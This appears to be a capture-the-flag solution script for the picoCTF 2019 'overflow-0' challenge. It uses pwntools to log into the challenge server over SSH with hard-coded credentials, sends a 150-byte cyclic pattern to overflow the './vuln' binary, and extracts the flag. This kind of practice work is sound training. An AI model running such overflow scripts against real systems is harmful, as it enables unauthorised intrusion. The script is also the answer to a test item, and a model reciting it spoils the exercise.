from pwn import *

session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)

random_str = cyclic(150)

program = session.process(['./vuln', random_str], cwd='/problems/overflow-0_1_54d12127b2833f7eab9758b43e88d3b7', stderr=1)

flagInB = program.recv()
flag = flagInB.decode('ascii')
rawFlag = flag[flag.index('{')+1:flag.index('}')]

print(rawFlag)
